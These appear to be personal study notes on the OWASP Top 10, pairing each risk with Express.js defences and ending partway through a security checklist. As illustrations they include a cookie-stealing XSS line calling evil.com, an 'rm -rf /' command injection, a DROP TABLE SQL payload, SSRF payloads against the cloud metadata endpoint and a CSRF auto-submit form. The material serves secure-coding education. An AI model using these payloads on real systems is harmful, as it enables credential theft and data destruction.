# List of things learned.

## 1. What is OWASP?

**OWASP** stands for the **Open Web Application Security Project**.

It is a non-profit, open-source community that produces free tools, documentation and research on web application security.

Everything they publish is freely available to everyone.

Their flagship publication, the **OWASP Top 10**, is updated every few years and lists the most critical security risks to web applications, ranked by data collected from hundreds of organisations worldwide.

```
OWASP Top 10 — 2021 Edition

  01 — Broken Access Control                       ← #1, found in 94% of apps tested
  02 — Cryptographic Failures
  03 — Injection
  04 — Insecure Design                             ← NEW in 2021
  05 — Security Misconfiguration
  06 — Vulnerable & Outdated Components
  07 — Identification & Authentication Failures
  08 — Software & Data Integrity Failures          ← NEW in 2021
  09 — Security Logging & Monitoring Failures
  10 — Server-Side Request Forgery (SSRF)          ← NEW in 2021
```

### Core Terminology.

```
Vulnerability  → A weakness in your code, config, or design that could be exploited.
                 Example: a login form with no rate limiting.

Exploit        → The actual technique used to take advantage of a vulnerability.
                 Example: a bot sending 10,000 login attempts per second.

Threat         → Any potential source of harm — a person, a bot, or an event.

Risk           → Likelihood that a threat exploits a vulnerability × the impact it causes.
                 Risk = Likelihood × Impact

CVE            → Common Vulnerabilities and Exposures.
                 A globally unique ID for a known vulnerability. E.g. CVE-2021-44228 (Log4Shell).

CVSS Score     → A 0–10 severity rating.
                 0.1–3.9 Low | 4.0–6.9 Medium | 7.0–8.9 High | 9.0–10.0 Critical
```

> **Mindset shift:** Security is not a feature you add at the end. A vulnerability found in production is 100× more expensive to fix than one caught during design. Every layer of your application — routing, input handling, storage, configuration — is an attack surface.

---

## 2. Broken Access Control.

**Ranked #1 in 2021. Found in 94% of tested applications.**

Access control enforces that users can only act within their permitted boundaries. Authentication proves _who you are_. Access control decides _what you are allowed to do_.

Broken access control is so prevalent because developers focus on making features work — restricting who can use them is an afterthought.

### How It Breaks.

**Insecure Direct Object Reference (IDOR).**

The most common form. You expose an internal database ID in a URL and never check if the requesting user owns that resource.

```
GET /api/invoices/1047   → returns your invoice  ✓
GET /api/invoices/1048   → returns another user's invoice  ✗ (IDOR)
```

An attacker simply increments the number. If your server returns the data without an ownership check, you have IDOR.

**Vertical Privilege Escalation.**

A regular user accesses functionality meant only for admins. This happens when admin endpoints exist but carry no role check — only the frontend button is hidden.

```
GET /api/admin/users
→ returns full user list even with a regular user's token   ← no role check on the server
```

**Missing Function-Level Access Control.**

The same as above — the route exists, the frontend hides it, but no middleware protects it server-side.

**Forced Browsing.**

Directly typing a URL to reach a page that should require login. If your server only checks auth on some routes, an attacker finds the unprotected ones.

### How to Defend.

**Deny by default.** Every route must be inaccessible unless access is explicitly granted. Never start from "allow all" and then restrict.

**Check ownership on every resource query.** Don't fetch a resource by ID alone — always add the user's own ID to the query.

```js
// ❌ Bad — any authenticated user can read any order
app.get("/api/orders/:id", authMiddleware, async (req, res) => {
  const order = await Order.findById(req.params.id);
  res.json(order);
});

// ✅ Good — ownership enforced at the query level
app.get("/api/orders/:id", authMiddleware, async (req, res) => {
  const order = await Order.findOne({
    _id: req.params.id,
    userId: req.user.id, // user can only ever get back their own records
  });
  if (!order) return res.status(403).json({ message: "Forbidden" });
  res.json(order);
});
```

**Role-based middleware (enforce server-side, never trust the frontend).**

```js
function requireRole(...roles) {
  return (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res
        .status(403)
        .json({ message: "Forbidden: insufficient permissions" });
    }
    next();
  };
}

// Usage
app.delete(
  "/api/admin/users/:id",
  authMiddleware,
  requireRole("admin"),
  deleteUserHandler,
);
app.get(
  "/api/reports",
  authMiddleware,
  requireRole("admin", "manager"),
  getReportsHandler,
);
```

**Log every access failure.** A flood of 403s from a single IP is a strong signal that someone is probing your API.

---

## 3. Cryptographic Failures.

**Previously called "Sensitive Data Exposure." Renamed in 2021 to address the root cause.**

Cryptographic failures happen when sensitive data like passwords, payment details, health records, API keys — is inadequately protected because:

- Weak or outdated algorithms are used (MD5, SHA1, DES).
- Strong algorithms are used incorrectly (missing a salt, a weak key, no expiry).
- No cryptography is used at all (plain-text passwords).

### Hashing vs Encryption.

These two are frequently confused. They serve completely different purposes.

```
Hashing
  One-way.  You cannot reverse it.
  Use for:  Passwords.
  Algorithm: bcrypt, Argon2, scrypt.

Encryption
  Two-way.  Can be decrypted with the correct key.
  Use for:  Data you need to read back (credit card numbers, API keys).
  Algorithm: AES-256-GCM.

Why you must never encrypt passwords:
  If your database is breached and an attacker gets the key,
  they can decrypt every single password instantly.
  With a proper hash, they must crack each one individually.
```

### Why MD5 and SHA1 are Broken for Passwords.

MD5 and SHA1 were designed to be _fast_ — for checksums, not passwords. A modern GPU can compute **10 billion MD5 hashes per second**.

A 6-character password falls in under a second.

`bcrypt` was designed to be _deliberately slow_. The `saltRounds` cost factor doubles the time per increment.

```
saltRounds=10 → ~65ms per hash
saltRounds=12 → ~250ms per hash   ← sensible default
saltRounds=14 → ~1000ms per hash

For a user logging in, 250ms is imperceptible.
For an attacker trying a billion combinations, it is prohibitive.
```

### Salting.

A salt is a random value generated uniquely per password before hashing. Without it:

```
hash("password123") → always the same output
→ attacker precomputes a rainbow table of common passwords and looks yours up instantly.
```

With salting:

```
hash("password123" + "xK9#mQ2p") → unique output
hash("password123" + "pL4$nR7z") → different unique output
→ rainbow tables are useless. bcrypt handles salting automatically.
```

### In Express.js.

```js
const bcrypt = require("bcrypt");

// Registering — hash before saving
const hashedPassword = await bcrypt.hash(req.body.password, 12);
await User.create({ email: req.body.email, password: hashedPassword });

// Logging in — compare against the stored hash
const user = await User.findOne({ email: req.body.email });
const isMatch =
  user && (await bcrypt.compare(req.body.password, user.password));
if (!isMatch) return res.status(401).json({ message: "Invalid credentials" });
// Return the same message whether the email doesn't exist OR the password is wrong.
// Different messages let attackers enumerate which emails are registered.
```

**Encrypting sensitive data at rest (e.g. a user's private API key).**

```js
const crypto = require("crypto");

const KEY = Buffer.from(process.env.ENCRYPTION_KEY, "hex"); // 32 bytes

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv("aes-256-cbc", KEY, iv);
  const encrypted = Buffer.concat([cipher.update(text), cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
}

function decrypt(text) {
  const [ivHex, encHex] = text.split(":");
  const decipher = crypto.createDecipheriv(
    "aes-256-cbc",
    KEY,
    Buffer.from(ivHex, "hex"),
  );
  return Buffer.concat([
    decipher.update(Buffer.from(encHex, "hex")),
    decipher.final(),
  ]).toString();
}
```

**HTTPS enforcement with HSTS.**

```js
const helmet = require("helmet");
app.use(
  helmet.hsts({
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true,
  }),
);
```

---

## 4. Injection.

**SQL Injection has appeared in every OWASP Top 10 since 2003.**

An injection attack happens when untrusted user input is passed to an interpreter — a SQL engine, OS shell, NoSQL driver, or template engine — without separating the _data_ from the _command_.

The interpreter executes the attacker's input as code.

### SQL Injection.

```js
// ❌ Vulnerable — string concatenation
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
```

Attacker enters `' OR '1'='1' --` as the email:

```sql
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = '...'
-- '1'='1' is always true. Returns the first user (often admin). Attacker is now logged in.
```

Attacker enters `'; DROP TABLE users; --`:

```sql
SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
-- Your users table is gone.
```

**Types of SQL injection:**

```
Classic (In-band)     → Results returned directly in the HTTP response.
Blind (Boolean-based) → No data returned; attacker infers data by asking true/false questions.
Time-based Blind      → Uses SLEEP() to infer data from response timing.
Out-of-band           → Data exfiltrated via DNS or HTTP from the DB server.
```

### NoSQL Injection.

```js
// Attacker sends this JSON body instead of a string:
// { "email": { "$gt": "" }, "password": { "$gt": "" } }

// ❌ Vulnerable
const user = await User.findOne({
  email: req.body.email,
  password: req.body.password,
});
// Query becomes: find user where email > "" AND password > ""
// Matches the first user in the collection — login bypassed.
```

### Command Injection.

```js
const { exec } = require("child_process");

// ❌ Vulnerable — user controls the filename
exec(`convert ${req.body.filename} output.png`, callback);

// Attacker input: "image.jpg; rm -rf /"
// Executes:       convert image.jpg; rm -rf /
```

### How to Defend.

**Parameterized queries — the primary defence against SQL injection.**

```js
// ❌ Vulnerable — concatenation
const result = await pool.query(`SELECT * FROM users WHERE email = '${email}'`);

// ✅ Parameterized — $1 is a placeholder; email is data, never code
const result = await pool.query("SELECT * FROM users WHERE email = $1", [
  email,
]);

// ✅ Multiple parameters
const result = await pool.query(
  "SELECT * FROM orders WHERE user_id = $1 AND status = $2",
  [userId, status],
);
```

**Validate all input against a strict schema before it reaches your database.**

```js
const { z } = require("zod");

const loginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8).max(128),
});

app.post("/api/auth/login", (req, res, next) => {
  const result = loginSchema.safeParse(req.body);
  if (!result.success) {
    return res.status(400).json({ errors: result.error.errors });
  }
  next(); // only valid, schema-conforming data proceeds
});
```

**Sanitize NoSQL operator injection.**

```js
const mongoSanitize = require("express-mongo-sanitize");
app.use(mongoSanitize()); // strips keys containing $ or . from req.body, req.params, req.query
```

**Avoid `exec()` with user-supplied data. Use `execFile()` with argument arrays instead.**

```js
// ❌
exec(`convert ${userInput} output.png`);

// ✅ arguments cannot be injected when passed as an array
const { execFile } = require("child_process");
execFile("convert", [userInput, "output.png"], callback);
```

**Least privilege on the database account.**

```sql
-- App DB user gets only what the app needs
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;
-- Never grant DROP, CREATE, or superuser to the app user
```

---

## 5. Insecure Design.

**New in the 2021 OWASP Top 10. Addresses problems that cannot be patched.**

Every other OWASP category describes an _implementation_ flaw — a mistake in code that could have been written correctly.

Insecure Design is different: the security property was never designed in to begin with. You cannot fix it with a patch. You must re-architect.

### Examples.

**User enumeration via password reset.**

```
❌ Bad:
  "We sent a reset link to that email."   (email exists)
  "No account found with that email."     (email does not exist)
  → attacker confirms which emails have accounts, then targets them with phishing.

✅ Good:
  "If an account exists with that email, you'll receive a reset link shortly."
  → same message in both cases. No information leaked.
```

**No rate limiting (by design).**

An API with no throttling at all allows brute-force of passwords, scraping of your database via sequential IDs, and enumeration of user emails via reset endpoints. Rate limiting is a design decision, not a middleware you bolt on later.

**Negative quantity exploit.**

```
A checkout that calculates total = price × quantity but never validates that quantity > 0.
Attacker sends quantity: -1 for a $100 item → total: -$100 → gets a credit applied to their account.
```

### Threat Modeling with STRIDE.

STRIDE is a framework for finding threats during the design phase, before any code is written. For each component and data flow in your application, ask:

```
S — Spoofing           Violated property: Authentication
                       Example: attacker forges a JWT to impersonate a user.

T — Tampering          Violated property: Integrity
                       Example: attacker modifies a price field in a hidden form field.

R — Repudiation        Violated property: Non-repudiation
                       Example: user denies making a purchase; no audit log exists to prove it.

I — Information        Violated property: Confidentiality
    Disclosure         Example: stack trace in a 500 error reveals DB schema.

D — Denial of Service  Violated property: Availability
                       Example: attacker floods the login endpoint, taking it offline.

E — Elevation of       Violated property: Authorization
    Privilege          Example: regular user accesses /api/admin routes.
```

### Key Design Principles.

```
Defense in Depth       Never rely on a single control. If one fails, others catch the attack.
                       Example: validate on frontend (UX) AND on server (security) AND in DB (schema).

Least Privilege        Every user, service, and component gets only the minimum access it needs.

Fail-Safe Defaults     Default state = secure. Deny access unless explicitly granted.

Separation of Duties   High-impact actions require more than one party to approve.
                       Example: a transfer above $10,000 requires two managers to authorise.
```

---

## 6. Security Misconfiguration.

**Consistently present in every OWASP edition. Entirely preventable.**

Security misconfiguration is not a bug in your logic, it is a failure of configuration, defaults, or operational hygiene. None of these require sophisticated exploitation. Attackers just look for the defaults.

### Common Misconfigurations.

**1. Verbose error messages in production.**

A stack trace in a production error response reveals: the exact file path on your server, the framework and version, the DB query structure, sometimes the ORM and model names. Attackers use this to look up known CVEs for that exact version.

```js
// ❌ Leaks internal details in production
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});

// ✅ Contextual — full details in dev only
app.use((err, req, res, next) => {
  const isDev = process.env.NODE_ENV === "development";
  console.error(err);
  res.status(err.status || 500).json({
    message: isDev ? err.message : "Something went wrong",
    stack: isDev ? err.stack : undefined,
  });
});
```

**2. Default credentials.** Databases and admin panels ship with `admin/admin`, `root/root`, `mongo/mongo`. Attackers scan for these automatically. Change every default credential before the service is network-accessible.

**3. Directory listing.** A web server with listing enabled exposes your file structure to anyone visiting a directory URL with no `index.html`. Config files, logs, and backups become downloadable.

**4. Overly permissive CORS.**

```js
// ❌ Any website can make authenticated requests to your API
app.use(cors({ origin: "*", credentials: true }));

// ✅ Explicit allowlist
const allowed = ["https://yourapp.com", "http://localhost:5173"];
app.use(
  cors({
    origin: (origin, cb) => {
      if (!origin || allowed.includes(origin)) cb(null, true);
      else cb(new Error("CORS: origin not allowed"));
    },
    credentials: true,
  }),
);
```

### HTTP Security Headers.

```
Content-Security-Policy     Controls which scripts/styles/resources the browser loads. Prevents XSS.
Strict-Transport-Security   Forces HTTPS for the duration. Prevents downgrade attacks.
X-Frame-Options             Prevents your page being embedded in <iframe>. Prevents clickjacking.
X-Content-Type-Options      Prevents MIME-sniffing. Always set to 'nosniff'.
Referrer-Policy             Controls how much referrer info is sent to other origins.
Permissions-Policy          Restricts browser features: camera, microphone, geolocation.
```

The `helmet` package sets sensible defaults for all of them in one line.

```js
const helmet = require("helmet");
app.use(helmet()); // must be applied before all routes

// Customise individual headers:
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
        imgSrc: ["'self'", "data:", "https:"],
      },
    },
    frameguard: { action: "deny" },
  }),
);
```

---

## 7. Vulnerable & Outdated Components.

Your application is not just your code. It is every package in `node_modules`, the Node.js runtime, the OS, and every piece of infrastructure it touches.

A vulnerability in any of those is a vulnerability in your application.

### Supply Chain Attacks.

```
event-stream (2018)
  A popular npm package, downloaded 2M times/week, was handed to a new maintainer
  who injected malicious code targeting a specific Bitcoin wallet app.
  Undetected for weeks.

Log4Shell (2021) — CVE-2021-44228, CVSS 10.0 (Critical)
  A zero-day in Apache Log4j (a Java logging library) allowed remote code execution
  on any server using it. Hundreds of millions of servers worldwide affected.
  Had nothing to do with application code.

colors.js and faker.js (2022)
  The original maintainer deliberately broke both packages in protest.
  Any application that auto-updated was immediately broken in production.
```

The lesson: **dependencies are code you didn't write but you trust**. That trust must be maintained actively.

### Understanding `package-lock.json`.

```
Without it:
  Two developers may install different versions of a transitive dependency.
  A CI build may pull a newer (possibly vulnerable or broken) version.
  You cannot reproduce the exact environment that was tested.

With it:
  Every install — dev, CI, production — gets the exact same version tree.

Always commit package-lock.json to version control.
Never add it to .gitignore.
```

### Semantic Versioning.

```json
{
  "express": "^4.18.2", // ^ allows MINOR and PATCH updates  (4.x.x)
  "lodash": "~4.17.21", // ~ allows only PATCH updates        (4.17.x)
  "axios": "1.4.0" // no prefix = exact version only
}
```

For production applications, consider pinning critical dependencies to exact versions and updating them deliberately, rather than letting them float.

### Practical Commands.

```bash
# See all known vulnerabilities in your current dependencies
npm audit

# Attempt to auto-fix vulnerabilities (semver-safe updates)
npm audit fix

# Force fix even if it involves breaking changes (test after!)
npm audit fix --force

# See which packages have newer versions available
npm outdated

# Remove installed packages not listed in package.json
npm prune

# Continuous monitoring via Snyk
npx snyk test
npx snyk monitor
```

---

## 8. Identification & Authentication Failures.

**Previously "Broken Authentication."**

Authentication failures let the _wrong person_ in. Access control failures (A01) let the right person do the wrong things. This category covers weaknesses in how a system proves who a user is.

### Attack Techniques.

```
Credential Stuffing
  After data breaches, billions of username/password pairs are sold online.
  Attackers test them against other sites automatically. Most people reuse passwords.
  Without rate limiting, millions of combinations can be tested undetected.

Brute Force
  Systematically trying every possible password combination.
  A 4-digit PIN with no lockout falls in under a minute.

Password Spraying
  Instead of trying many passwords against one account (triggers lockout),
  attackers try one common password ("Password1!") against thousands of accounts.
  Much harder to detect, never triggers per-account lockout.

Session Hijacking
  If a token is sent over HTTP (not HTTPS), an attacker on the same network
  captures it with Wireshark in seconds.
  If tokens never expire, a stolen token is valid forever.
```

### Rate Limiting Auth Endpoints.

```js
const rateLimit = require("express-rate-limit");

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 10, // max 10 attempts per IP per window
  message: { error: "Too many attempts. Try again in 15 minutes." },
  standardHeaders: true,
  legacyHeaders: false,
});

app.post("/api/auth/login", authLimiter, loginHandler);
app.post("/api/auth/register", authLimiter, registerHandler);
app.post("/api/auth/forgot-password", authLimiter, forgotPasswordHandler);
```

### Secure Cookie Configuration.

```js
res.cookie("refreshToken", token, {
  httpOnly: true, // JavaScript cannot read this — prevents XSS token theft
  secure: true, // HTTPS only — never sent over plain HTTP
  sameSite: "strict", // Not sent with cross-site requests — prevents CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000,
  path: "/api/auth", // Only sent to the auth path — not every request
});
```

### Refresh Token Rotation.

Access tokens should be short-lived (15 minutes). Refresh tokens are longer-lived and used only to get new access tokens. Rotation means a refresh token is invalidated the moment it is used and a new one is issued.

```js
app.post("/api/auth/refresh", async (req, res) => {
  const { refreshToken } = req.cookies;
  if (!refreshToken) return res.status(401).json({ message: "No token" });

  // 1. Check it exists in DB (not yet used or revoked)
  const stored = await RefreshToken.findOne({ token: refreshToken });
  if (!stored) return res.status(401).json({ message: "Invalid token" });

  // 2. Verify signature and expiry
  const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);

  // 3. Delete the used token — it can never be used again
  await RefreshToken.deleteOne({ token: refreshToken });

  // 4. Issue new access token AND new refresh token
  const newAccess = jwt.sign(
    { userId: decoded.userId },
    process.env.JWT_SECRET,
    { expiresIn: "15m" },
  );
  const newRefresh = jwt.sign(
    { userId: decoded.userId },
    process.env.REFRESH_SECRET,
    { expiresIn: "7d" },
  );

  await RefreshToken.create({ token: newRefresh, userId: decoded.userId });

  res.cookie("refreshToken", newRefresh, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
  });
  res.json({ accessToken: newAccess });
});
```

### TOTP (Multi-Factor Authentication).

TOTP (Time-based One-Time Password) is the mechanism behind Google Authenticator and Authy. Both the server and the authenticator app independently compute a 6-digit code from a shared secret and the current time. The code changes every 30 seconds.

```js
const speakeasy = require("speakeasy");
const QRCode = require("qrcode");

// Setup — generate a secret and show the user a QR code once
const secret = speakeasy.generateSecret({
  name: `YourApp (${user.email})`,
  length: 32,
});
const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);
// Save secret.base32 to the user's record in the database
// Display qrCodeUrl to the user — they scan it with their authenticator app

// Verify — on every login after MFA is enabled
const isValid = speakeasy.totp.verify({
  secret: user.mfaSecret,
  encoding: "base32",
  token: req.body.totpCode,
  window: 1, // allow ±30s of clock drift
});
if (!isValid) return res.status(401).json({ message: "Invalid MFA code" });
```

---

## 9. Software & Data Integrity Failures.

**New in 2021. Incorporates the previously standalone "Insecure Deserialization" category.**

This category covers situations where code or data is used without verifying it has not been tampered with between its source and your application.

### Insecure Deserialization.

Serialization converts an in-memory object into a storable format (JSON, binary). Deserialization is the reverse. The risk: deserializing untrusted data into a complex object can trigger unexpected code execution.

In some languages (Java, PHP, Python's pickle), this leads to Remote Code Execution. In Node.js, the equivalent risks are:

```js
// ❌ NEVER execute user-supplied code
eval(req.body.code);
new Function(req.body.fn)();

// ❌ JWT algorithm confusion attack
// Some JWT libraries accept the algorithm from the token header itself.
// Attacker changes header to { "alg": "none" }, removes signature — library accepts it as valid.
jwt.verify(token, secret); // ❌ trusts the token's own alg claim

// ✅ Always specify which algorithm you expect
jwt.verify(token, secret, { algorithms: ["HS256"] }); // ✅
```

### Subresource Integrity (SRI).

When you load a script from a CDN, you trust that CDN completely. If it is compromised, every visitor to your site loads attacker code. SRI lets the browser verify a hash of the expected file content — if the file has changed, the browser refuses to run it.

```html
<!-- ❌ No SRI — you fully trust the CDN -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<!-- ✅ With SRI — browser checks the hash before executing -->
<script
  src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
  integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
  crossorigin="anonymous"
></script>
```

Generate SRI hashes at [https://www.srihash.org](https://www.srihash.org).

### CI/CD Pipeline Security.

Your deployment pipeline is part of your attack surface.

```yaml
# ❌ Mutable tag — the action maintainer can change what this points to
- uses: actions/checkout@v3

# ✅ Pinned to a specific commit SHA — immutable
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
```

Best practices:

```
- Pin GitHub Actions to commit SHAs, not tags.
- Use least-privilege service accounts in CI (deploy only — not read all secrets).
- Never print secrets in CI logs (echo $SECRET is a common accidental exposure).
- Scan build artefacts before deployment.
```

---

## 10. Security Logging & Monitoring Failures.

An application that does not log security events is blind. The industry average for how long an attacker has undetected access (**dwell time**) is over 200 days.

Logging does not prevent attacks, but it enables you to detect them, respond to them, limit the damage and prove what happened to regulators afterward.

### What to Log.

A useful log entry answers: **Who** did **what** to **which resource** from **where** at **when**, and did it **succeed or fail?**

```
✅ Always log:
  - Successful login, failed login (with IP — never the password)
  - Account lockout triggered
  - Password change or reset
  - Authorization failure (a 403 — someone tried to access something they can't)
  - Admin actions: user created/deleted, role changed, config modified
  - Unusual patterns: many 4xx errors from one IP

❌ Never log:
  - Passwords (obviously)
  - JWT tokens or session IDs (these are credentials — logging them creates a second attack surface)
  - Full credit card numbers or CVVs
  - PII beyond what compliance requires
```

### Structured Logging with Winston.

```js
const winston = require("winston");

const logger = winston.createLogger({
  level: "info",
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json(), // machine-readable — searchable by SIEM tools
  ),
  transports: [
    new winston.transports.File({ filename: "logs/error.log", level: "error" }),
    new winston.transports.File({ filename: "logs/combined.log" }),
  ],
});

// Log a security event
logger.warn({
  event: "AUTH_FAILURE",
  email: req.body.email, // not a secret — the email being targeted
  ip: req.ip,
  userAgent: req.headers["user-agent"],
  reason: "invalid_password",
});

logger.info({
  event: "AUTH_SUCCESS",
  userId: user.id,
  ip: req.ip,
});

logger.warn({
  event: "ACCESS_DENIED",
  userId: req.user?.id,
  resource: req.path,
  method: req.method,
  ip: req.ip,
});
```

### Alerting.

Logs are only useful if someone or something reads them. In production, set up alerts for:

```
> N failed logins from the same IP in 5 minutes     → brute force
> N failed logins for the same account in 1 hour    → credential stuffing
Access to admin routes by non-admin users
A sudden spike in 500 errors                        → something is being probed/exploited
```

---

## 11. Server-Side Request Forgery (SSRF).

**New in the 2021 OWASP Top 10, driven by the explosion of cloud infrastructure.**

SSRF happens when your server makes an HTTP request to a URL that is partially or fully controlled by the attacker. Your server is tricked into making requests on the attacker's behalf — from inside your network, bypassing all external firewalls.

In cloud environments this is especially dangerous. AWS, GCP, and Azure all expose a **metadata endpoint** at `http://169.254.169.254/` that returns the IAM credentials for the cloud instance — the keys that authorise API calls to your entire cloud infrastructure.

### The Attack.

A legitimate "link preview" feature: user enters a URL, your server fetches it, returns a preview.

Attacker enters: `http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role`

Your server dutifully fetches this from inside your cloud network and returns:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "abc123...",
  "Token": "...",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

The attacker now has your AWS credentials. They can read from S3, access any service the role is authorised for, and potentially escalate privileges.

Other payloads:

```
http://localhost:6379              → hit Redis on the same server
http://10.0.0.1/admin              → access internal admin panel
file:///etc/passwd                 → read local files (if file:// is supported)
http://internal-db:5432            → probe internal services by hostname
```

### How to Defend.

```js
const { URL } = require("url");
const dns = require("dns").promises;

const PRIVATE_IP =
  /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.)/;

async function isSafeUrl(inputUrl) {
  let parsed;
  try {
    parsed = new URL(inputUrl);
  } catch {
    return false;
  }

  // Only allow HTTPS
  if (parsed.protocol !== "https:") return false;

  // Resolve hostname to IP and verify it's not a private range
  // DNS resolution is essential — without it, an attacker can register
  // mysite.com pointing to 169.254.169.254 and bypass a simple hostname check.
  try {
    const { address } = await dns.lookup(parsed.hostname);
    if (PRIVATE_IP.test(address)) return false;
  } catch {
    return false;
  }

  return true;
}

app.post("/api/preview", async (req, res) => {
  const { url } = req.body;
  if (!(await isSafeUrl(url))) {
    return res.status(400).json({ error: "URL not allowed" });
  }
  const response = await fetch(url, {
    redirect: "error", // don't follow redirects — could redirect to private IP
    signal: AbortSignal.timeout(5000),
  });
  res.json({ preview: (await response.text()).slice(0, 200) });
});
```

---

## 12. Cross-Cutting Defenses.

These vulnerabilities span multiple OWASP categories and are critical enough to warrant their own section.

### Cross-Site Scripting (XSS).

XSS allows attackers to inject malicious JavaScript into pages viewed by other users. A script running in the context of your site has full access to the DOM, `localStorage`, `sessionStorage`, cookies (that aren't `httpOnly`), and can make authenticated API calls on behalf of the user.

**Types:**

```
Stored XSS      Payload saved to DB, served to every user who loads the page.
                Example: attacker posts <script>fetch('https://evil.com?c='+document.cookie)</script>
                as a blog comment. Every reader exfiltrates their own cookie.

Reflected XSS   Payload is in the URL, immediately echoed back in the response.
                https://site.com/search?q=<script>alert(1)</script>
                Anyone who clicks this link (sent via email) is affected.

DOM-based XSS   Entirely client-side. Malicious data in the URL fragment is written to the DOM.
                document.getElementById('msg').innerHTML = location.hash.slice(1);
```

**Defence in depth:**

```js
// 1. Output encoding — use escaped rendering in templates
//    In EJS: <%= user.comment %>   (escapes)  ✅
//            <%- user.comment %>   (raw HTML)  ❌

// 2. Avoid dangerous DOM APIs with user data
element.innerHTML = userInput; // ❌ — executed as HTML
element.textContent = userInput; // ✅ — treated as text, never executed

// 3. DOMPurify when rendering rich HTML is unavoidable
import DOMPurify from "dompurify";
element.innerHTML = DOMPurify.sanitize(userHtml);

// 4. Content Security Policy — last line of defence
//    Even if a payload gets in, CSP blocks the script from executing
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // no inline scripts, no external scripts
    },
  }),
);
```

### Cross-Site Request Forgery (CSRF).

CSRF exploits the fact that browsers automatically include cookies with every request to a domain, regardless of where that request originates.

**The attack:**

```
1. You are logged into bank.com. Your session cookie is in your browser.
2. You visit evil.com which contains a hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to"     value="attacker_account">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
3. Your browser submits the form to bank.com with your session cookie attached automatically.
4. bank.com sees a legitimate authenticated request. The transfer goes through.
```

**Defence:**

```js
// Modern primary defence: SameSite cookie attribute
res.cookie("sessionId", token, {
  sameSite: "strict", // cookie NOT sent with cross-site requests
  httpOnly: true,
  secure: true,
});
// If your API uses JWT in the Authorization header (not cookies),
// CSRF is not a concern — browsers never auto-attach Authorization headers.
```

### Mass Assignment.

Mass assignment occurs when you blindly pass request body fields to your database model. An attacker can include fields you never intended to be user-controllable.

```js
// Your User model: { name, email, password, isAdmin, subscriptionTier }

// ❌ Mass assignment — attacker sends { "isAdmin": true } in the body
app.post("/api/profile", authMiddleware, async (req, res) => {
  await User.findByIdAndUpdate(req.user.id, req.body); // attacker is now admin
});

// ✅ Explicit field selection
app.post("/api/profile", authMiddleware, async (req, res) => {
  const { name, email } = req.body; // only these two are user-editable
  await User.findByIdAndUpdate(req.user.id, { name, email });
});
```

---

## 13. Security Testing Basics.

Understanding vulnerabilities conceptually is half the job. You also need to be able to find them in your own code.

### Burp Suite Community Edition.

Burp Suite is the industry-standard tool for manual web application security testing. It acts as a proxy between your browser and the server, letting you intercept and modify every HTTP request and response.

```
Intercept    Pause requests in flight and modify them before they are sent.
Repeater     Replay a captured request with modifications — essential for testing IDOR and injection.
Intruder     Automated fuzzing with a list of payloads — brute-force testing.
Decoder      Encode/decode base64, URL encoding, JWT tokens.
```

### OWASP ZAP.

Free, open-source, maintained by OWASP. Includes a manual proxy and an automated scanner.

```bash
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://yourapp.com
```

Use only against your own staging environment — the active scanner sends potentially malicious requests.

### Static Analysis (SAST).

```bash
npm install --save-dev eslint-plugin-security

# .eslintrc.js
module.exports = {
  plugins: ['security'],
  extends: ['plugin:security/recommended'],
};

npx eslint .
```

Flags: `eval()` and `new Function()` with non-literal arguments, `exec()` with user-controlled input, `Math.random()` for security-sensitive operations (should use `crypto.randomBytes()`).

### The Attacker Mindset.

Developers ask: _"Does this work for valid input?"_ Security testers ask: _"What happens with invalid, unexpected, or malicious input?"_

```
Inputs to test on every field:
  ""                              empty string
  "a".repeat(10000)               very long string
  "' OR 1=1 --"                   SQL injection
  '{ "$gt": "" }'                 NoSQL injection
  "../../../etc/passwd"           path traversal
  "<script>alert(1)</script>"     XSS
  -1, -9999                       negative numbers
  99999999999999                  very large numbers
  null, undefined, 0, false       falsy values
```

---

## 14. Secure Express App Checklist.

Use this before shipping any project. Each unchecked box is a known risk you are consciously accepting.

```
Authentication & Session
  □ Passwords hashed with bcrypt (min 12 salt rounds)
  □ JWT secret is 32+ random characters, stored in env vars
  □ Access tokens expire in ≤15 minutes
  □ Refresh tokens stored in DB and rotated on every use
  □ Refresh tokens invalidated on logout
  □ Rate limiting on all auth routes (login, register, forgot-password)
  □ All auth cookies: httpOnly + secure + sameSite: strict
  □ Password reset tokens expire in 1 hour and are single-use
  □ "Forgot password" returns the same message whether email exists or not

Authorization
  □ Every route has explicit auth middleware
  □ Every resource query includes an ownership check (no IDOR)
  □ Role checks enforced server-side on every protected route
